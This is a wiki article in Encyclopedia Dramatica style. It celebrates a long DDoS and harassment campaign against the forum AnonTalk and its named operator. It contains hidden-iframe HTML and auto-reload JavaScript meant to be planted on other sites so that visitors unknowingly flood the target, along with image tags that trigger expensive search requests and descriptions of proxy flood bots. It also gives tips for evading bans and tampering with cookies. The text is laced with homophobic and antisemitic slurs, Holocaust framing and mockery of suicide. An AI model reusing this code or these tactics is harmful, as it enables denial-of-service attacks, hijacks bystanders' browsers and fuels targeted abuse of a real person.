'''Shitnami''' is a tool written specifically to fuck with Faggottalk and Kimmo's sanity. It exploits a pretty lulzy hole in Faggottalk's deep search function to bypass the search flood detection. Meaning we can send as many deep search requests as we want, as fast as we want. Sad MySQL is sad. 

Threading and proxies supported. Requires .NET framework (v3.5, or possibly v2.0 though I haven't tested that myself). Should run on Linux if you know what you're doing (WINE is your friend).

STILL IN DEVELOPMENT so don't yell at me if there's bugs.

<i>See also: [http://partyvan.info/wiki/AnonTalk insurgen.info].</i>

On December 12th 2008 [[Anonymous]] finally says [[NO U]] to AnonTalk's constant shitpost spamming clogging up all the *[[chans]]' tubes and declares [[DDoS|WOAR!!!]] on the Swedish [[pedo|meatball]] "Sysop".

All the *[[chans]] were vigorously spammed with the raid date of December 13th/14th ([[UK|GMT]]) and several [[IRC]] channels were set up -from Rizon to [[insurgen.info]]- to better coordinate a massive [[DDoS]] of AnonTalk [[spam|faggotry]].

Although ED itself does not troll or conduct raids, the [[girlvinyl|Queen]] and [[ED Government|her court]] gave their blessings to these fearless and godly [[Internet Superheroes]], wished them God speed, and dispatched reporters to the [[Internets|battlefield]].

A day before AnonTalk was to be [[buttsecks|buttræped]], Anon's forward scouts ascertained that AnonTalk was completely down and this intel led [[some argue|many to believe]] that '''Sysop''' had pulled the plug on his crappy site to evade the wrath of Anon. There was also speculation that since he'd recently had his advertising pulled and his [[GayPal]] suspended with the [[in the butt|loot still in it]], AnonTalk was dead because of massive amounts of [[FAIL]]. However, /[[b]]/tards awoke to fresh AnonTalk spam [[copypasta]] threatening [[I'm pressing charges|legal action]] to anyone foolish enough to [[DDoS]] without [[7 proxies]]. This was met with raging boners and joy that the faggot was going to try and put up a fight.

Ultimately, nothing of value was lost and AnonTalk came back a couple of days after spending some quality time with teh [[rAIDS]]. Meanwhile, 4chan's /[[b]]/ came to a grinding halt after hundreds of [[newfags]] deserted the sinking ship as it was getting walloped with a tsumani of [[spam]]. For a few glorious hours, /b/ was almost as good as it never was; /[[b]]/tards didn't have to [[bump]] their own posts and threads didn't [[404]] in 30 seconds.

:''Remember, remember, the 13 of December''
:''AnonTalk, 6pm [[4chan]] time, and DoS.''

{{quote|/b/rothers, let me speak frankly for a second.

Make Anontalk suffer. It is a blight upon the face of our internet and a mockery to our power.

Never forgive. Never forget.|Anonymous to Anonymous}}

==OPERATION ANTFUCK 2==
[[File:AntFuckII.jpg|thumb|AntFuck poster]][[File:AntFuckIIBlack.jpg|thumb|[[Moar]]]]
Long ago, AnonTalk declared war on Anonymous and moot.  When moot was winning the Time 100 Influential people poll by a landslide, Kimmo used his spambots and his army of [[brainwashing|brainwashed]] followers (called AnTs) to downvote moot until even the [[Jonas Brothers]] exceeded moot.  (Keep in mind Kimmo was spamming his site to /b/ at the same time, too.  He is always spamming his site to /b/.)  Anonymous could not stand this faggotry, so a few Anons decided to do Operation Antfuck 2.  However instead of using methods like DDoS that have always worked, they just tried to post insults to the forum and they didn't even use the proper technique.  The raid was a [[fail]]ure.

==OPERATION ANTFUCK 3==
April 11'th, everyone gathered in some IRC channel where we met this dude named "f." f seemed like a pretty cool guy, eh was talking about taking down AT and shit and didn't afraid of anything.  Until all of a sudden, he used his botnet to take down the site about an hour before the raid was set to commence, which was after the irc used [[Dangerous_Kitten|bwraep]] to suck down around half of AT's reported normal monthly allotted bandwidth. /b/ rejoiced, some more anons wanted more justice so they egged f on to take down www.fredfigglehorn.com as proof it was in fact him that DDoSd AT. Which he did. Fin.

More details:
on the 12th f had his botnet running at 2Gbit/s for 5 hours pouring down on AT, resulting in over 36TB of [[rape]].
Wonderful thing is that an User named "C_T_X|BNC" found out that AT only has a Traffic limit of 1Tb so Kimmo is probably gonna
get dropped by his russian benefactors or needs to pay ~19cents per Gb Overtraffic (36Tb = 6840$).

Down again today. Hosting ran out, maybe?
''Apparently'', Kimmo pulled the plug when he saw a thread on /b/. Expect to see him pop up again soon...

It is possible that a brave /b/tard got AnonTalk v& for being a CP host and pedophile congregation site.

===Victory===
[[File:AnonTalk Victory 1.png|center|Sysop announces his surrender]]
On April 17, after recovering from a three-day period of downtime, Sysop announced that he would stop spamming [[the chans]]. Once again, [[Anonymous]] has proven himself to be unstoppable and immune to all attacks. But Anonymous will not stop in his quest until this horrible travesty of a site is crushed into the ground, because no one who comes up against anonymous lives to tell the tale. So get reporting to his ISP and the FBI, etc.!

On April 18, it went down again, and came back up again on a [[GodJesus]] awful server that is likely in Sysop's basement.

Less than two weeks later, the spam resumed and the great circle of spam was complete.

Victory was short-lived. Spamming for AnonTalk on 4Chan still exists to this day, and probably always will as long as Kimmo Johan Alm refuses to accept that he's not the iconic moot.

==Permanent Takedown: Report CP and spamming activity==
[[File:Anondns.jpg|thumb|right|Sent to AnonTalk's DNS host.]]

A good way to put some nails in the coffin of anontalk is to get the site on at least one of the child porn blacklists out there. Getting anontalk blocked will take a massive chunk out of its userbase and make the forum even more dead than it already is.

[[Protip]]: Do not mention 4chan, or ED, do not use terms as "CP" and "loli" write out the full words. When linking anontalk, link to the [http://hiderefer.com/?http://www.anontalk.se/hot_topics Hot Topic] section as it always contains pedo shit. Include an explanation that CP is an acronym of "Child Pornography" as the people reading the mail may not find anything odd with "Where can I get CP?". When reporting what the site does, explain that it acts as a platform for pedophiles to exchange contacts, material, links and tips on child-sex tourism, and that it has a "VIP section" not accessible publicly that contains lots of child pornography. Some sites may say that Anontalk is already down, while not quite sure why, [[some argue|some people argue]] that Kimmo has blocked a number of known Goverment IPs using hacks and [[peergaurdian]].

Use these to report Anontalk and kimmo.

'''Complaints relating to the spam and child pornography AnonTalk is spewing everywhere can be sent to:'''
:'''-Domain Registrar: http://www.eurodns.com contact them.  Also they're on twitter.  So tweet @EuroDNS and report them there too. http://www.eurodns.com/eurodns/contactSupport and abuse@eurodns.com and LegalServices@EuroDNS.com and http://www.eurodns.com/documents/impressum and sales@eurodns.com

Some good points to mention:<br/>
- AT supports pedophilia. "CP" from the "Hot Topics" page<br/>
- Spam websites for years<br/>
- Big companies ban him for a reason and Kimmo even makes a rage list which Eurodns sure wouldn't want to be on ( [http://hiderefer.com/?http://www.anontalk.se/unserious_fraud_scam_companies_and_services http://www.anontalk.se/unserious_fraud_scam_companies_and_services] )<br/>
- EuroDNS you sure you want to support a pedo site<br/>
- Think of the damn children<br/>


:'''-DNS Host: http://www.prq.se/?p=contact&intl=1 -- You need a court order for these people to do something, so get one Sweden anons!'''

Kimmo also ripped off the site AnotherTalk by stealing their domain anothertalk.com from them.  anothertalk.com redirects to anontalk.com so all the same reporting still applies.  Report them at http://www.internetbs.net/en/domain-name-registrations/contact.html and there's even a LiveChat on that site to use for reporting, too.

Things to mention when reporting them:
* The spam and how they are on Wikipedia Abuse Filter #7 for spam.  Show them http://www.archivum.info/wikibugs-l@lists.wikimedia.org/2008-06/msg00904.html and http://en.wikipedia.org/wiki/Special:AbuseFilter.  When showing them, give the links to the abuse filter details showing the spam flooding in.  Abuse filter [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=7 #7], [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=215 #215], [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=228 #228], and [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=230 #230]. Mention that they should click the buton "details" on each spam to see the fill diff of the spam.
* Point out how the only if you search google news for their site's name with a full archive search, the only mention is of them attacking other websites: http://www.foxnews.com/story/0,2933,534941,00.html http://www.npr.org/templates/story/story.php?storyId=92767742
* Mention how in the "hot topics" of the forum, how most stuff is about CP.  Mentioning this to every other place will make them take more notice of the spam reports.

==Trolling the site==
[[File:Anontalk secrets.png|thumb|[[DO IT FAGGOT!]]]]
[[File:Kimmolelskykatrellsky.jpg|thumb|Kimmo trying to vandalize this page trolololo]]
[[File:Fuckoffkimmo.png|thumb|lolb& for ED vandalism!]]
Kimmo's so-called advanced artificial intelligence moderation system is in fact a bunch of crude word filters and a lot of banned hostnames.  Beyond that, there is no automated moderation at all.  When nobody is moderating the site, it instantly fills with posts that Kimmo doesn't like.

{{quote|Some wiseguy ''[Kimmo-speak for assistant moderator]'' traitor (hopefully not you) has apparently leaked screenshots of the internal tools here. Fuck him/her and burn in hell.|Kimmo "Sysop" Alm, privately to his assistant moderators}}

Want to make a new thread and not wait 3 minutes?  Don't use the restore ID function as that makes you wait 3 more minutes each time.  Simply export a dozen AnonTalk IDs and to import nto your browser for later.

Because of his complete lack of friends (both online and IRL) Kimmo goes nuts when no one posts for more than an hour. Therefore it is probably best to only spam when other people are actively posting because otherwise you'll just be giving him something to do.

By 2010, every single "wiseguy" on his site was a secret troll.  They only reason they remove trolling is that Kimmo will unmake them if they don't.

==[[Holocaust|Final Solution code (see more below)]]==
The /i/nsurgency developed a powerful chemo as part of the FINAL SOLUTION (discussed below) to rid Anontalk from the Intertubes.

Add this bit of code to '''the bottom of the page''' on all boards/pages of [[4chan]] and [[Shit_nobody_cares_about|other chans]]:

<iframe src ="http://www.anontalk.se/" width="0" height="0" border=0 style="display:none;width:0px; height:0px; border: 0px;">



It will load AT once for every time someone views a page.  The invisible iframe will mean that it is nice and unintrusive to the [[David|user]] experience.

Revised JavaScript code:

<script type="text/javascript">
setInterval ( "ReloadLeechIframe()", 5000 );

function ReloadLeechIframe ()
{
document.getElementById("LeechIframe").contentDocument.location.reload(true);
}
</script>

<iframe src ="http://www.anontalk.se/" width="0" height="0" border=0 style="display:none;width:0px; height:0px; border: 0px;" id="LeechIframe">

Will make Anontalk load the same page over and over in an endless loop.

For [[forum]] spamming/planting use:

phpBB:
[url=http://www.anontalk.se/deep_search/lol][img]

vBulletin/Invision Power Board:
[img]http://www.anontalk.se/deep_search/lol[/img]

This will trigger requests for deep searches from the forums, whittling away at AT's bandwidth.  However, in order for this to work on a grand scale, it would have to be implemented on 4chan, which will probably never happen because [[moot]] is a giant [[faggot]].

Unfortunately Kimmo has now employed a method to break out of iframes so those codes don't work anymore so you need a non-[[JavaScript]] version of it and then use it with JavaScript turned off.

{{quote|To whoever keeps using bots to search for "lol": you are not slowing anything down, idiot. Sure — the server may be a big pile of shit, but it's not from the 19th century…|Kimmo "Sysop" Alm, in a September 2009 bulletin, clearly not reading this article}}

==Additional trolling techniques==
As it is near impossible to post on Anontalk through a proxy (which you will probably need due to Sysop's constant [[Nazi|arbitrary shitlisting]]), it has become necessary to find new ways through which to troll the fuck out of the site over and over again.

*'''Create a clone''' - download AnotherTalk's free open source code for ATBBS and go create an AnonTalk clone.  Kimmo is pretty pissed about it and tries to shut every clone down with fake abuse reports and [[DDoS]] attacks.  [http://overtalk.org Source code is on the bottom left of the page here.]  Kimmo considers all similar software to be illegal clones, despite the fact that his software is a clone of [[Wikipedia:UBB.classic|UBB.classic]], written in 1996.
*'''Polls''' - The AT polls have absolutely no restriction on who can vote on them. Get behind a [[proxy]] and vote down any idea for changes to the site or anything that promotes paedophilia (or in fact anything that Sysop [[Buttsex|likes]]). The more people do this, the more likely it is that Sysop will be butthurt over the amount of people not subscribing to his ideals. Sysop now bans people for voting in both female and male polls, now 99% of his userbase has left/been banned for being transexual. He really fucking rages hard when you vote on both male and female polls so make accounts just to do that over and over.
*'''Private Messages to Harass Sysop''' - It used to be the "wishing well" that did this but Kimmo has since blocked it.  However,  [http://hiderefer.com/?http://www.anontalk.se/new_private_message_for_Sysop http://www.anontalk.se/new_private_message_for_Sysop] still works but only if your host name isn't banned.  But what will work is to file an elaborate abuse report.  Kimmo blocked it so only regulars can use it, but it still works if the hostname is banned.  To bypass it, edit your cookies from anontalk.com so num_posts is in the hundreds and you can use it again.  Then you can just bomb those shit in and nothing is stopping them.  Kimmo will shit himself.  Or go to [http://hiderefer.com/?http://www.anontalk.se/new_bulletin http://www.anontalk.se/new_bulletin] and use a bot or script to generate random junk.
*'''Post shit''' - It is easy to get unbanned from AnonTalk. Try to make a "quality post" using Tor... It won't work, but if Kimmo notices you tried to post something decent and were blocked, he will whitelist you. (Save your ID/password until he does this.) Once you're [http://hiderefer.com/??http://www.anontalk.se/status_check whitelisted], go ahead and [[troll]], spam or post [[copypasta]] (that always works well).
*'''Discuss the site with a thread''' - Start a thread that makes a negative comment on the site. Kimmo hates people saying anything bad about his precious board.
*'''Rogue Wiseguy''' - This one takes a bit of time and planning. Kimmo is so desperate for Wiseguys that his requirements are stupidly low - 100 posts. All you need to do is *shudder* contribute 100 quality posts, then apply to be a Wiseguy saying something like "I've always hated Retardchan, I want to help banish its idiotic users from the Best Site in the World™" and when Kimmo makes you a wiseguy, you are free to go completely batshit and [[ban fucking everyone]]. Be warned, when he catches you he will ban you, shitlist you and scramble your password. Who cares? You'll have caused enough rage that he'll shit bricks.
[[File:Wiseguy_lulz.png]]<br>
The above was performed by an anonymous Tinychan user on a wiseguy ID that Joe DDM (a somewhat notorious TC namefag) had donated to him with this as the intent; however, Joe DDM could not do this himself because his parents found out that he was using AnonTalk and threatened to take away his laptop if he ever went on that site again.
* Easy wordfilter bypass: http://www.upsidedowntext.com

==THE FINAL SOLUTION==
In August of 2009, the /i/nsurgency set off to exterminate Anontalk once and for all. Many incidents led up to this ultimate plan. The last straw was when Kimmo's cronies attacked the peaceful *chan of Krapple Komputer Kompany (lol KKK).

==Kimmo starts to break==
[[File:Kimmo1251594368tinychancomic3.png|left|thumb|"''I'm losing money every day.''"]]
{{quote|OK. That's it. I will no longer be working on the board until there is tons of quality traffic.

I'm losing money every day from being ignored while running the best site on the Web, which nobody knows about because you stupid fucks suck. It's up to YOU now. (Since you won't lift a finger to help me even now: fuck off and eat shit. AT is dead.)|Sysop begins to see sense at last.}}

Keep fucking with him. He's nearing a [[butthurt|breakdown]].

==New strategy results in win==
On August 26, 2009, [[:File:Aug26victory.png|DNS host Gandi gave Anontalk the boot]].

{{quote|Feel free to donate some money… we’ll need it.

The gross incompetence and total disregard for somebody else’s property out there is… staggering.}}

Notice how he doesn't [[BAWWWWWWWWWWWWWWW]] about disregard for other people's property when it comes to him spamming or about bannings when he does it. As anons all across the Internet broke into celebration, Kimmo probably shat himself.

The victory was short-lived, as Kimmo moved the site onto Network Solutions. But that was just a ticking time bomb as it's well known they won't tolerate bad sites.  August 31, Network Solutions realized that they wanted nothing to do with a faggot who managed to get kicked off of Paypal, Google AdSense, and GoDaddy--just to name a few. AND Kimmo got his SSL certificate revoked. Lots of jewgold was flushed down the drain.

Whenever his domain goes down, nobody visits his site.  The only posts during that time are obvious fake content of Kimmo talking to himself so he can avoid showing a three day gap in new threads.

As of September 30, 2009, Anontalk's off-site news had this to say:
"Yet another fucking DDoS attack; donations fucking needed already."

{{quote|A donation of $50,000 USD or so would be nice now.|Kimmo slowly realizing he is fucked. - October 1, 2009}}

[[File:LAWLBANKRUPT.png|right|thumb|[http://anontalk.baywords.com/ LAWL BANKRUPT]]]

The New Strategy is to stop all traffic, because the only real traffic he gets is from trolls pretending to get on his good side. he has 8 regular visitors who aren't secretly waiting to spam and troll the shit out of him.

solution- Boycott. nobody go. make him pee his pants.

[[Gentlemen|Gentlemen]], we are winning.

==March 2010: Kimmotherapy==
[[File:Kimmotherapyposter.png|right|thumb|Promotional poster for Operation Kimmotherapy]]

Some faggots that assembled in IRC devised a new strategy, because [[O rly|obviously they would be successful and not fail like the other /b/tards]]. To combat these [[Hackers on steroids|new methods]], Kimmo lost a lot of sleep while coding [[Bullshit|advanced artificial intelligence]].

TL;DR: a botnet flooded "WHY DO YOU BULLY LOLI?" and a script shitposted a bunch of memes. Kimmo RAGED.

The Kimmotherapy raid was ultimately fail, but some dedicated anons split off to form [[Jews|Some 11-year-olds]] and continued the trolling.

{{quote|It appears as if somebody finally has figured out how to use bots here. Sigh…|Kimmo has a brief moment of clarity - March 26, 2010}}

===PissBlaster9001===
[[File:PissBlaster9001.png|thumb|PissBlaster9001 screenshot]]
'''[http://pastebin.com/raw.php?i=vzL4wZ7s PissBlaster9001]''' is a 1500+ line [[Bash]] script that requires cURL and [[Perl]]. It connects to AnonTalk through HTTP proxies, pretends to be a [[Pedo|regular user]], and [[Piss|blasts the board with piss]]. Despite having the source code and [[Unemployment|unlimited time]], Kimmo has been unable to defeat it. Dear Leader did not realize that a board managed by a grammar [[Nazi]] would produce a [[Delicious Cake|delicious source]] of [[copypasta]].

At its peak, the script was generating [[win|over 2000 posts per day]] (four times higher than typical AnonTalk traffic) at a rate of five per session ID. When more than 70 instances run during moderate traffic, AnonTalk generates database errors because [[Fail|Kimmo has no money]].

A PHP version has also been created, and is built to run on the command line.

The latest version (1.8.1) is broken; it needs a slight adjustment to the logic that controls its loops. AnonTalk is in permanent lockdown, though, so fixing the script would provide few lulz.

===Additional scripts===
* [http://pastebin.com/raw.php?i=6BMGtf4P Topic Raeper] repeatedly loads random topics through proxies to put a high load on the CPU and RAM
* [http://www.alltalk.in/draep DashboardRaep] repeatedly submits dashboard adjustments through proxies to put a high load on the CPU and disk. The updated version fixes a few bugs and adds more [[raep]].
* [http://pastebin.com/raw.php?i=5324mhz6 HTTPShitter] cycles through SSL handshakes to put a high load on the CPU (repeatedly solves large prime numbers and then hashes data with inefficient ciphers; run only one instance per IP address). This is one of those LOIC things that you should do with a group; using this also means Kimmo can't access ANT since he, being the paranoid self he is, uses HTTPS for ''everything''.

==WIN==

[[Fag|Some 11-year-olds]] continued to [[Rape|harass]] Kimmo and report him to various agencies. Dear Leader, after [[CP|failing to heed their warnings]], was dropped from Key-Systems.net DNS services on April 5, 2010. 

[[File:Anontalkdead.png|thumb|right|But April 6, it was back.]]

The next day, not understanding that nobody wants to have his pedo site anywhere near their servers, Kimmo tried to register Anontalk's domain with EuroDNS, this was not left unnoticed by some heroic [[Tinychan|TCers]], who quickly logged on their [[Twitter]] accounts and [[spam|contacted]] EuroDNS, demanding an answer for a simple but very important question:

{{quote|@EuroDNS, why are you providing services for the [[pedo|paedophile]] website AnonTalk.com ?|WHY DO YOU BULLY LOLI - April 6, 2010}}

EuroDNS, fearing that [[Chris Hansen]] would show on their door with a couple of vans and some seats, did the only reasonable thing they could and set AT's registry to 127.0.0.1.

{{quote|We are not providing any services and we have actually [[win|closed the site]] as soon as we were notified of its [[CP|content]]. Thank You.|[[Gentlemen]], we are winning}}

[[File:Kimmo-bulletin-eurodns-threat.png|thumb|right|Kimmo threatens EuroDNS with gun violence (April 20).]]

On April 12 the domain returned and was properly resolving to PRQ. It seemed like the [[Fail|battle was lost]], but [[Fag|some 11-year-olds]] kept thrusting like they were fucking [[your mom]]. Victory was set in stone on April 16, when EuroDNS set the domain to a 30-day deletion period called “redemptionPeriod” and the root DNS servers stopped resolving anontalk.com.

{{quote|…the domain registrar is stealing my domain… this is a nightmare.|Kimmo, on losing the war}}

Anonymous promptly back-ordered the domain and is currently awaiting the mid-May transfer of ownership. Meanwhile, they continue to rape the corpse of anontalk.com, now known as anontalk.se

{{quote|Here lies ANT / Born from CP and raised with spam / Killed by CP and buried in spam.|Burn in hell.}}


Why EuroDNS did what they did
* They hate pedophiles
* Kimmo mailbombed them
* They tried posting on Kimmo's site and got this:
{{quote|Error: Our trusty ol' Trollbuster 2000™ has detected, most likely correctly, that you are a worthless little psycho bitch troll. Thus, you have been automatically banned and shitlisted without the need for any human moderator to even lift a finger. How does that make you feel? Bouncing up and down in your diaper? (Go fuck yourself and don't ever come back here, you utter waste of oxygen.)|Kimmo's website automatically does this if you give the new URL to AnonTalk, at-proxy.kimmoa.se, the URL to his status page at.kimmoa.se, or anything because it has "kimmo" in it}}
* They read Kimmo's bulletins

==Bye bye DNS==
{{quote|I simply cannot kill my own child, so I will continue running AnonTalk BBS even without the domain.

I have removed most instances of references to ".com" around the site and will update any remaining ones later. Proxy hosts continue to work for now.|Kimmo|29th of April 2010}}

==Blocked by NOD32==

[[File:Anontalkseblocked.png|right|thumb|lol.]]
As of 13th May 2010, AT was blocked by NOD32.

==Kimmo has a complete nervous breakdown==

On the 15th May 2010, Kimmo was rageposting bulletins and was forcing his [[trolls|three remaining regulars]] to read the drivel before posting.

[[Image:Kimmoflippedagain.png|center|FUCK YOU TROLLS]]

Gentlemen, we are winning.

==Domain purchased==
[[Image:Kimmoismad.png|thumb|left|]]
[[Image:Anontalk_hijacked.png|thumb|right|]]
On May 23rd, some [[faggot|fagtardicus]] purchased the domain Anontalk.com after it was put out for sale again. A web-based chat room was set up in its place. Kimmo then started to [[rage]], sending [[email]]s to the person who bought the domain demanding him to give him the domain back (although it would probably just be [[pwn|dropped again]]). On this night [[Tinychan]] raved, with Tinychanners asking the domain owner to redirect the site to [[goatse|other sites and such]], such as [[partyvan|cia.gov]] and [[virus|free screensavers]].

The owner of the domain then pointed anontalk.com towards Tinychan, forever pwning Kimberley. In fact, anontalk.com was already a blacklisted word on his forum beforehand. Shortly after, a clone of AnonTalk was set up, Kimmo performed [[DDoS]] plus [[crapflood]] attacks contaning [[Grawp]]-style death threats.

[[Image:KimmoIsMad.jpg|thumb|center|Kimmo spamming anontalk.com, the illegal clone of anontalk.com]]

<s>During recent events, anontalk.com now points to [http://anonbbs.com/ anonbbs.com]. Here you will find a bunch of fuck Kimmo threads, fake CP threads and the like.</s> Jk, he just didn't want to be [[dox|doxed]].

Now, AnonTalk.com[http://www.AnonTalk.com/] is <s>an '''illegal''' clone of [[Tinychat]]</s> a mirror of WikiLeaks.

=New Domain=

Kimmo has a new domain that points to his shitty board. Its http://www.anontalk.se

Efforts are already under way to kill this site like the last one but help is needed.  Just do what you've done every other time and kill this fucktards DNS.

<s>EDIT: Website has been killed already.</s>

As of July 23rd 2010 around 12:00PM PST, anontalk.se was DDoS'ed yet again with Operation AnT in retaliation from many 4channers getting banned for "anontalk spam" the night before.  All erroneous bans seem to have been revoked, though the retaliatory attack was without mercy.

=End Days=
As of 6 July, 2010 Kimmo was threatening his regulars with the [[Do_it_faggot|complete shutdown of the site]]. On the 17th of september AnonTalk closed. Nothing of value was lost.

Also with the newly introduced [[CAPTCHA|reCAPTCHA]] verification, Kimmo can no longer spread his “little messages” to any of the boards — making whatever “threat” he has left virtually non-existent.

'''Moral of the story:''' don't spam the largest, most misanthropic site on the Internet.

<s>With [[Tinychan]] gone,</s> [http://www.tinychan.org Tinychan is back, but] no more large-scale raids are being planned. Though this may be good thing since Kimmo rages either when his site is full of spam and trolls, or is dead beyond existence. Tinychan has been replaced by a new site, [[Minichan BBS|Minichan]], where users can <s>talk freely, without the fear of censorship</s> suck some tiny mod cock and read nonstop shitposts and unfunny memes.

==Death of Anontalk==

{{quote|"Last topics created 5 hours, 8 hours and 9 hours ago." ← I'll be killing AT forever very soon. The reason is that after all this time, I have received nothing but shit for all my hard work and the site is still dead, completely regardless of what I do. There is no hope anymore. I've been trying to warn you about this, but nobody has listened. The final straw was how even PRQ stabbed me in the back by hosting an illegal phishing clone, giving me bullshit excuses and ignoring all my arguments. Bye.|Kimmo Alm, [[WIN|giving up]].}}

On September 2010, [[Minichan|Minichan's]] "phishing clone board" http://www.atbbs.org went up and began spamming Anontalk, which, combined with other factors, caused Kimmo to cease his angry bulletins for 4 days from the 13th to the 17th. On the Seventeenth of September, 2010, at approx. 1.30PM GMT, Kimmo Alm finally snapped.and closed down Anontalk [[lie|forever]].

==Return of Anontalk==

[[Image:Kimmo Alm Phoenix (better).png|thumb|right| rising anew from the ashes like Phoenix the bird.]]

{{quote|*rises anew from the ashes like [[doing it wrong| Phoenix the bird]]* I refuse to go.

I DO NOT WANT TO MEET THE PERSON WHO THEN DOESN'T "RANT".|Kimmo Alm, [[irony| feeding the trolls.]]}}

{{quote|I can tell from the total deadness coupled with the extreme fucktardism that you have absolutely no intention of even trying to save AT. You can all go fuck yourselves.|Kimmo Alm, approaching a final breakdown}}




However, Kimmo necromanced his shitty shambling corpse of a board within 5 days, and followed up with the usual 'I can't kill my child' and 'Stop being dead and start spreading the fucking word this time... or else!' bulletins. He likely considers this an [[win| epic win]], as he will have shown his users that he's not just a lame duck empty threat machine, and is totally super [[srs]] about closing it if more people don't come, but ironically his closing it will have driven almost all his remaining [[sick fuck| users]] away, and most of them will never return. After all, who, after being told that the website is being 'killed forever', and then sees it 404, would ever try and visit the URL again, especially after 5 days? It is also costing him double to host it under the new IP address, [[DDoS| 88.80.5.16]].

Thus, Kimmo Alm, in his [[retard| stupidity]], has [[An Hero| shot himself]] in his own foot once more.

These days, Kimmo makes an empty threat or [[implying implications| implication]] that he will kill AnonTalk for good every day. As he stated, he has dedicated his life to making the ultimate web site and forum for the English speaking population of the planet. I guess you better get started, Kimmo, because AnonTalk certainly isn't it.
{{bigpic|ant.png|frame|200}}
And if even one of those [[samefag]]s were real, then Kimmo would have had an actual donation.

=Cuntbots=
A bunch of fags in [irc://irc.n0v4.com/bulletins this IRC channel] have been hitting AnT with homemade cuntbots. These include:
* '''KRaep''' - a script for DDoSing AnonTalk through transparent proxies (the same method Kimmo uses). Ask ltamake or savetheinternet for this script, it isn't public since Kimmo getting his hands on it would be very, very bad.
* '''DRaep''' - a script that raeps AnonTalk's database by submitting dashboard changes through proxies. Can be found [http://www.alltalk.in/draep here].
* '''IDRaep''' - a script that creates IDS on AnonTalk through Tor for use with other scripts. 
* '''EARaep''' - a script that submits Elaborate Abuse Reports (EARs) through Tor, containing such phrases as "I kissed K | i | m | m | o and I liked it, taste of his cherry chapstick" and "I want your love and I want your revenge, you and me caught in a Kim romance. I want your love and your mother\'s revenge, you and me caught in a Kim romance". However, it might be broken after a day of using it.
* '''IA.sh''' - a script that visits a bunch of topics on AnonTalk and then "induces amnesia" (Kimmo-talk for removing topic flags). This works well and rapes the database.
* '''BumpRaep''' - a script that randomly bumped old topics on AnonTalk. It's broken since Kimmo removed it for non-regular posts (which made him truly rage).

==Second Death of Anontalk==
On [[Last Thursday|Thursday 14th October]], some [[hero]] started hammering the shit out of Alm's server. Technically, this isn't a DDoS, because it's not actually distributed: one or a very small number of high-bandwidth servers are being used for the attack instead of a botnet. These types of attacks are normally trivial to stop since there's normally no more than half a dozen IPs that need to be blocked at the router level (as compared with hundreds or thousands with a real DDoS). It isn't known why Kimmo hasn't stopped it, but many speculate that he likely pissed off PRQ to the point that they are not willing to help him, likely because he sent death threats and/or spammed their support ticket system. Since the site just had the usual 'I will kill AT soon if you don't spread the word' bulletins a short while before that, most of the regulars simply assumed that the site was shut down once again, ensuring that the shitty website will be even deader than it was before. However, those who know anything about the internet will realise that the error message is a [[SNCA|timeout message as opposed to a cannot find server message]]. The site is still down as of October 31st, and the person or persons behind the attack wish to remain [[Anonymous]]. Since AnonTalk's death, the [[pedophiles| regular users]] of Kimmo's site have migrated from his unauthorized illegal clone to several of the legal clones.

==Second Return of AnonTalk==

Remember, remember, the fourth of November. Kimmo brought PedoTalk back from the dead [[trying too hard| yet again]] on an [[asking for it| American Host]] called [[juggalo| Black Lotus]]. The new IP address is 208.64.126.218, but beware -- Kimmo now has [[bullshit| DDoS protection]]. Despite being hosted in the [[United States]], They don't seem to give a shit about all of the [[CP| questionable material]] on the site. Kimmo tried ''really'' hard for about 2 weeks to keep his [[rage| rage bulletins]] to a minumum. Of course, being [[Kimmo Alm]] he quickly lost his shit, spurred along by [[faggots]] from [[Tinychan| a different, shitty BBS]] coordinating [[crapfloods]] on an IRC channel. After a few nights of being [[irony| mercilessly spammed]], Kimmo showed how far gone he really is when he posted this bulletin:

{{quote|The minimum amount of posts to bypass [[Nazi| pre-moderation]] has been raised from 10 to 100 due to all the [[trolls| worthless subhuman fucktards]] posting only to get established and then spamming their [[Tinychan| illegal]] [[Minichan BBS| clones]] here. [[SNCA| New wiseguys needed since at least one of the previous set was a traitor (AGAIN) and it's impossible to know which one; all three deny it as always.]] You should have a minimum of [[Unrealistic expectations| 2,000 posts and your ID should be at least 2 years old. Or donate a minimum of $500 (but then you still need 500 posts minimum)]].]|Kimmo Alm, on how [[modfag| moderating]] his [[shit| shitty site]] is something you need to pay [[money| 500 dollars]] for the [[goatse| privilege]] to do}}

Losing the ability to easily flood the site, a boycott of AnonTalk was called for, and only a couple of hours in, Kimmo [[orgasm| exploded with rage]]. Because you now have to have your [[at least 100| first 100]] posts pre-moderated by Kimmo, there is really no point in trolling the site, but cuntbots are still A-OK. For now, AnonTalk's activity has dropped to virtually [[divide by zero| zero]].

==Third Death of Anontalk==
{{quote|Depending on the response from a certain company, this might be the last bulletin ever. If AT goes down today, I simply have [[Poor|no means of keeping it on-line anymore]], [[Bawww|nor do I really have any will to]] after [[Asking for it|being treated like shit for so long]] for creating and running the [[Lie|best Web site on the Internet.]]|Kimmo, 20/11/2010.}}
On November 19th, 2010, ltamake opened a new clone called AnonTalk.us on Kimmo's host, Black Lotus. The clone ran his proprietary (he will release the source code soon) ALTBBS, which is an ''exact'' clone of AnT. This made Kimmo rage (supposedly, BL got DMCA takedown notices and rage from him, but never forwarded it to ltamake), and he soon came to his senses by [[win|shutting down AnonTalk]]. Ltamake says he will continue the clone, but it will be moved to the [[Tinychan]] server since he cannot afford [[expensive|Black Lotus]].

==Third return of Anontalk==
On November 27th, Anontalk went online again, <s>this time making the ability to read kimmos bulletins a privilege for regulars only. Reading Kimmo rage was the only reason for anyone to visit Anontalk anymore, the shambling corpse of the site is suspected to be even more dead this time.</s> '''UPDATE:''' As of 11 January, the bulletins are public again, probably because Kimberly realised people were just reading them at IWantABro anyway.

=Anontalk in 2011=
==Anontalk Turns Three==
Kimmo, in true [[Unwarrented_self_importance|self congratulatory manner]], has posted a massive block of text proclaiming himself a programming genius and celebrating the fact that his aborted fetus of a shitty board will soon turn three. Preparations are already underway for completely not giving a shit. Laugh, cry, but ultimately be afraid of just how our Kimmo is losing his mind, [http://hiderefer.com/?http://www.anontalk.se/topic/69302 here] (at least until it's hosted somewhere else). Pay careful attention to the posts made by his [[Samefag|"fans"]] to get a true sense of his madness.

